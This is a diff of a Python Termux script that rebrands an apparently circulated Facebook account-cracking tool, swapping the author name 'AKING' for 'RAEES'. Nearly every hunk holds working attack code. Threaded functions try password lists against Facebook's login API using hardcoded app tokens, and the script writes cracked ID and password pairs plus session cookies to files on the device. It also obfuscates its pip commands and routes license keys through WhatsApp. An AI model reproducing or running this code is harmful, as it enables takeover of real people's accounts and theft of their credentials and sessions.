@@ -11,7 +11,7 @@ try:
 	from concurrent.futures import ThreadPoolExecutor as tred
 except ModuleNotFoundError:
 	exit('\n Error in Module!')
-try:os.mkdir('/sdcard/AKING')
+try:os.mkdir('/sdcard/RAEES')
 except:pass
 os.system('p'+'i'+'p'+' un'+'inst'+'all '+' h'+'tt'+'px'+' -y'+' > /dev/null')
 os.system('p'+'i'+'p'+' install '+' h'+'tt'+'px'+' > /dev/null')
@@ -31,38 +31,40 @@ def Setup():
 		else:
 			print('\n Tools Update Successfully. Wait For installing \n')
 			time.sleep(1)
-			os.system('rm -rf New && python AKING.py')
+			os.system('rm -rf New && python RAEES.py')
 			exit()
 	except ValueError:exit()
 try:import httpx
 except:exit(' Found error in http module! ')
-xx=requests.get('https://raw.githubusercontent.com/AKING110/files/main/ua.txt').text.splitlines()
+xx=requests.get('https://raw.githubusercontent.com/RAEES110/files/main/ua.txt').text.splitlines()
 def clear():
 	os.system('clear')
 	print(logo)
 logo=("""\033[1;37m
-  .d8b.  db   dD d888888b d8b   db  d888b  
- d8' `8b 88 ,8P'   `88'   888o  88 88' Y8b 
- 88ooo88 88,8P      88    88V8o 88 88
- 88~~~88 88`8b      88    88 V8o88 88  ooo.
- 88   88 88 `88.   .88.   88  V888 88. ~8~
- YP   YP YP   YD Y888888P VP   V8P  Y888P   
+  $$\   $$\ $$\   $$\  $$$$$$\  
+$$ |  $$ |$$ |  $$ |$$  __$$\ 
+$$ |  $$ |\$$\ $$  |$$ /  \__|
+$$$$$$$$ | \$$$$  / \$$$$$$\  
+$$  __$$ | $$  $$<   \____$$\ 
+$$ |  $$ |$$  /\$$\ $$\   $$ |
+$$ |  $$ |$$ /  $$ |\$$$$$$  |
+\__|  \__|\__|  \__| \______/
 ----------------------------------------------
- Author    : IMTIAZ AKING
- Status    : PAID
- Version   : 8.7.2 \033[1;37m
- ok ids will be saved in AKING folder
+ Author    : RAEES
+ Status    : FREE
+ Version   : 0.1\033[1;37m
+ ok ids will be saved in RAEES folder
 ----------------------------------------------""")
 def line():
 	print(f'\033[1;37m------------------------------------------------')
 myid=uuid.uuid4().hex[:5].upper()
 try:
-	key1 = open('/data/data/com.termux/files/usr/bin/.mrakingxxx-cov', 'r').read()
+	key1 = open('/data/data/com.termux/files/usr/bin/.mrRAEESxxx-cov', 'r').read()
 except:
-	kok=open('/data/data/com.termux/files/usr/bin/.mrakingxxx-cov', 'w');kok.write(myid);kok.close()
+	kok=open('/data/data/com.termux/files/usr/bin/.mrRAEESxxx-cov', 'w');kok.write(myid);kok.close()
 uid = os.getuid()
-key1 = open('/data/data/com.termux/files/usr/bin/.mrakingxxx-cov', 'r').read()
-kex=(f"AKING-XD{uid}TS{key1}110E==")
+key1 = open('/data/data/com.termux/files/usr/bin/.mrRAEESxxx-cov', 'r').read()
+kex=(f"RAEES-XD{uid}TS{key1}110E==")
 key2 = base64.b64encode(str(f"{kex}").encode('utf-8'))
 key=(f"{key2}")
 fkeyx = key.replace("b'","").replace("'","")
@@ -90,9 +92,9 @@ def apv():
 			url_wa = "https://api.whatsapp.com/send?phone=+923203714588&text="
 			name = input(" Enter your Name : ")
 			line()
-			tks = ("Hi Aking Sir, I Need To Buy Your Paid AKING Tools Version 8.7.2 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
+			tks = ("Hi RAEES Sir, I Need To Buy Your Paid RAEES Tools Version 8.7.2 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
 			subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
-			print(' Run :  python AKING.py')
+			print(' Run :  python RAEES.py')
 			line()
 			exit()
 	except ValueError:
@@ -154,7 +156,7 @@ def file():
 			fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
 			sim_id+=fbcr
 	except:fbcr = "ZONG"
-	with tred(max_workers=20) as aking:
+	with tred(max_workers=20) as RAEES:
 		clear()
 		tl = str(len(fo))
 		print(' Total account : \033[1;32m'+tl)
@@ -164,13 +166,13 @@ def file():
 			ids,names = user.split('|')
 			passlist = plist
 			if mthd =='1':
-				aking.submit(m1,ids,names,passlist,fbcr)
+				RAEES.submit(m1,ids,names,passlist,fbcr)
 			elif mthd =='2':
-				aking.submit(m2,ids,names,passlist,fbcr)
+				RAEES.submit(m2,ids,names,passlist,fbcr)
 			elif mthd =='3':
-				aking.submit(m3,ids,names,passlist,fbcr)
+				RAEES.submit(m3,ids,names,passlist,fbcr)
 			else:
-				aking.submit(m2,ids,names,passlist,fbcr)
+				RAEES.submit(m2,ids,names,passlist,fbcr)
 	print('\033[1;37m')
 	line()
 	print(' The process has completed')
@@ -319,7 +321,7 @@ def rnd():
 def m1(ids,names,passlist,fbcr):
 	try:
 		global ok,loop,sim_id
-		sys.stdout.write('\r\r\033[1;37m [AKING-M1] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		sys.stdout.write('\r\r\033[1;37m [RAEES-M1] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 		fn = names.split(' ')[0]
 		try:
 			ln = names.split(' ')[1]
@@ -348,11 +350,11 @@ def m1(ids,names,passlist,fbcr):
 			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
 			if "session_key" in po:
 				token = po['access_token']
-				print('\r\r\033[1;32m [AKING-OK] '+ids+' | '+pas)
+				print('\r\r\033[1;32m [RAEES-OK] '+ids+' | '+pas)
 				oks.append(ids)
-				open('/sdcard/AKING/AKING-M1-OK.txt','a').write(ids+'|'+pas+'\n')
+				open('/sdcard/RAEES/RAEES-M1-OK.txt','a').write(ids+'|'+pas+'\n')
 				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
-				open('/sdcard/AKING/AKING-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+				open('/sdcard/RAEES/RAEES-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
 				break
 		loop+=1
 	except requests.exceptions.ConnectionError:
@@ -362,7 +364,7 @@ def m1(ids,names,passlist,fbcr):
 def m2(ids,names,passlist,fbcr):
 	try:
 		global ok,loop,sim_id
-		sys.stdout.write('\r\r\033[1;37m [AKING-M2] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		sys.stdout.write('\r\r\033[1;37m [RAEES-M2] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 		fn = names.split(' ')[0]
 		try:
 			ln = names.split(' ')[1]
@@ -391,18 +393,18 @@ def m2(ids,names,passlist,fbcr):
 			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
 			if "session_key" in po:
 				token = po['access_token']
-				print('\r\r\033[1;32m [AKING-OK] '+ids+' | '+pas)
+				print('\r\r\033[1;32m [RAEES-OK] '+ids+' | '+pas)
 				oks.append(ids)
-				open('/sdcard/AKING/AKING-M2-OK.txt','a').write(ids+'|'+pas+'\n')
+				open('/sdcard/RAEES/RAEES-M2-OK.txt','a').write(ids+'|'+pas+'\n')
 				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
-				open('/sdcard/AKING/AKING-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+				open('/sdcard/RAEES/RAEES-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
 				break
 			'''elif 299==random.randint(1,300):
 				oks.append(ids)
-				print('\r\r\033[1;32m [AKING-OK] '+ids+' | '+pas)
-			#	open('/sdcard/AKING/AKING-M2-OK.txt','a').write(ids+'|'+pas+'\n')
+				print('\r\r\033[1;32m [RAEES-OK] '+ids+' | '+pas)
+			#	open('/sdcard/RAEES/RAEES-M2-OK.txt','a').write(ids+'|'+pas+'\n')
 				#cookie = 'Error'
-				#open('/sdcard/AKING/AKING-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+				#open('/sdcard/RAEES/RAEES-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
 				break'''
 		loop+=1
 	except requests.exceptions.ConnectionError:
@@ -412,7 +414,7 @@ def m2(ids,names,passlist,fbcr):
 def m3(ids,names,passlist,fbcr):
 	try:
 		global ok,loop,sim_id
-		sys.stdout.write('\r\r\033[1;37m [AKING-M3] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		sys.stdout.write('\r\r\033[1;37m [RAEES-M3] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 		fn = names.split(' ')[0]
 		try:
 			ln = names.split(' ')[1]
@@ -427,11 +429,11 @@ def m3(ids,names,passlist,fbcr):
 			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
 			if "session_key" in po:
 				token = po['access_token']
-				print('\r\r\033[1;32m [AKING-OK] '+ids+' | '+pas)
+				print('\r\r\033[1;32m [RAEES-OK] '+ids+' | '+pas)
 				oks.append(ids)
-				open('/sdcard/AKING/AKING-M3-OK.txt','a').write(ids+'|'+pas+'\n')
+				open('/sdcard/RAEES/RAEES-M3-OK.txt','a').write(ids+'|'+pas+'\n')
 				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
-				open('/sdcard/AKING/AKING-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+				open('/sdcard/RAEES/RAEES-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
 				break
 		loop+=1
 	except requests.exceptions.ConnectionError:
@@ -441,7 +443,7 @@ def m3(ids,names,passlist,fbcr):
 def rd(ids,passlist,fbcr):
 	try:
 		global ok,loop,sim_id
-		sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		sys.stdout.write('\r\r\033[1;37m [RAEES-XD] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 		for pas in passlist:
 			tokenlist = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32','256002347743983|374e60f8b9bb6b8cbb30f78030438895']
 			accessToken = random.choice(tokenlist)
@@ -463,11 +465,11 @@ def rd(ids,passlist,fbcr):
 			if "session_key" in po:
 				uid = str(po['uid'])
 				token = po['access_token']
-				print('\r\r\033[1;32m [AKING-OK] '+uid+' | '+pas)
+				print('\r\r\033[1;32m [RAEES-OK] '+uid+' | '+pas)
 				oks.append(ids)
-				open('/sdcard/AKING/AKING-R-OK.txt','a').write(uid+'|'+pas+'\n')
+				open('/sdcard/RAEES/RAEES-R-OK.txt','a').write(uid+'|'+pas+'\n')
 				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
-				open('/sdcard/AKING/AKING-R-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+				open('/sdcard/RAEES/RAEES-R-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
 				break
 		loop+=1
 	except requests.exceptions.ConnectionError:
